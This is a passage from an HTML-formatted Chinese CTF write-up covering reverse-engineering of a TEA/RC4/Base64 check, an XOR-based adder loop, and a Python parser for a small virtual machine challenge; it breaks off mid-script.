    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v21 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1272) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)off_7FF7D3D02010 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1272) )
    {
      print((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;/* 从内存中取出的数据
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    unsigned char off_7FF7D3D02010[] =
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    {
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        0x06, 0xAB, 0x05, 0x6A, 0xA0, 0x72, 0x71, 0x0D, 0x0A, 0x6F, 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        0xAC, 0x15, 0x05, 0xA5, 0x76, 0x41, 0x0A, 0x77, 0x13, 0xD8, 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        0x69, 0x03, 0x14, 0x78, 0xD5, 0xA8, 0x44, 0x0F, 0xA7, 0x76, 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        0x05, 0xAA, 0xA4, 0x09, 0x69, 0xA7, 0x0B, 0x11, 0x15, 0x42, 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        0x11, 0x72, 0x14, 0xAD, 0x00, 0x00, 0x00, 0x00
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    };
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    */&lt;/span&gt;
    v1272 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;至此全部分析完毕，依次进行了TEA，RC4和Base64，中间进行了密钥生成，最后做个反向进行解密即可。&lt;/p&gt;
&lt;h3 id=&#34;补充静态分析while语句实现的加法运算&#34;&gt;补充：静态分析while语句实现的加法运算&lt;/h3&gt;
&lt;p&gt;之前的分析其实是用python实现一遍，然后找规律得到的（毕竟为了速度），但还是应该稍微静态分析一下具体发生了什么事情&lt;/p&gt;
&lt;p&gt;看的时候就感觉很像是数电中的加法器，还是用简单的例子分析一下（删去了没有用到的语句）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;v1153 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ll &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;                  &lt;span style=&#34;color:#75715e&#34;&gt;// 判断结尾是否为1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;v1152 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ll &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;                  &lt;span style=&#34;color:#75715e&#34;&gt;// 如果结尾是1，将其变为0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                                 &lt;span style=&#34;color:#75715e&#34;&gt;// 如果结尾是0，将其变为1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v1153 ) {                &lt;span style=&#34;color:#75715e&#34;&gt;// 如果此前结尾为1，将会涉及到进位的问题，因此进入循环
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                                 &lt;span style=&#34;color:#75715e&#34;&gt;// 如果此前结尾为0，就没有进位的问题了，无需进入循环
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v1150 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1153;           &lt;span style=&#34;color:#75715e&#34;&gt;// 将结尾左移1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v1153 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1153) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; v1152; &lt;span style=&#34;color:#75715e&#34;&gt;// 与加法之后的结果再进行一次按位与，这个的目的是看接下来是否还需要进位
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v1152 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; v1150;              &lt;span style=&#34;color:#75715e&#34;&gt;// 进行无进位加法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}                                &lt;span style=&#34;color:#75715e&#34;&gt;// 什么时候不会产生进位的问题了，什么时候就可以退出循环了
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;ll &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1152;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单的说，就是用异或运算作为无进位的加法，然后通过一个while循环来完成进位&lt;/p&gt;
&lt;h2 id=&#34;vs&#34;&gt;vs&lt;/h2&gt;
&lt;p&gt;这道题就比赛的时候简单看了一下，逆向难度很低，从一个文件读取指令，另一个文件当作内存，vm指令其实不难，但文件中的指令很多，需要手写一个vm的分析代码。&lt;/p&gt;
&lt;p&gt;写完之后发现行数略多，先手动分析找了找规律，然后写了个自动化脚本提取，生成python代码，直接拿flag。&lt;/p&gt;
&lt;h3 id=&#34;vm的解析脚本&#34;&gt;vm的解析脚本&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vmreader.py:&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;memory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3A&lt;/span&gt;
]

cnt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OPCode&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, code_len, code, arglen, pes_code):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;code_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code_len
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arglen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arglen
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pes_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pes_code

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Reader&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, file):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(file, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;asm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_asm&lt;/span&gt;(self, asm: OPCode):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;asm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(asm)
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; cnt
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; len(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;asm:
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;code(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf[:a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;code_len]):
                    &lt;span style=&#34;color:#75715e&#34;&gt;# self.output += a.pes_code&lt;/span&gt;
                    op_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf[:a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;code_len]
                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf[a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;code_len:]
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; op_code &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
                        print (cnt, op_code)
                        cnt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
                    args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [_ &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf[:a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arglen]]
                    a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pes_code(op_code, args)
                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf[a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arglen:]
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                print (cnt, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
                cnt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;basic_io_code&lt;/span&gt;(op_code):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; op_code &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xFF\xFF&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;basic_io_op&lt;/span&gt;(op_code, args):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; cnt
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; args[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; print &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (cnt, args[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]))
            cnt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; print &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (cnt, args[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]))
            cnt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; args[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; mem[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] = &amp;lt;input&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (cnt, args[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]))
        cnt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; args[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; exit(0)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; cnt)
        cnt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (op_code, args)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp_code&lt;/span&gt;(op_code):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(op_code, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8000&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp_op&lt;/span&gt;(op_code, args):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; cnt
    pc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(op_code, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;) 
    addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1FF&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (memory[(addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;cnt&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; goto &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;cnt &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((pc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;cnt&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; nop&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; if ((mem[ &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ] &amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ) &amp;amp; 1) == 0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (cnt, addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;goto &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;cnt&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;((pc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;) &lt;span 